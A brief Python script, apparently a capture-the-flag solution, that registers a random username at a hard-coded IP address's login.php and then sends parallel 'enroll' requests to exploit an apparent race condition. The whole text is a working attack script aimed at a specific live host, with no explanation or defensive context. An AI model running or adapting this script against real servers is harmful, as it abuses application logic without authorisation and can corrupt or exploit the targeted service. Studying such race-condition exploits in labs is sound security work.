import requests
import json
from multiprocessing import Pool
import random
name="".join(map(chr,[random.randint(0,25)+ord('a') for _ in range(5)]))

def run():
	s=requests.Session()
	data={"username":name,"password":"12345"}
	p=s.get("http://178.128.84.72/login.php?",params=data)
	print name
	s.get("http://178.128.84.72/login.php?action=enroll")
	s.get("http://178.128.84.72/login.php?action=enroll")



pool=Pool()
pool.apply_async(run)
pool.apply_async(run)
pool.close()
pool.join()
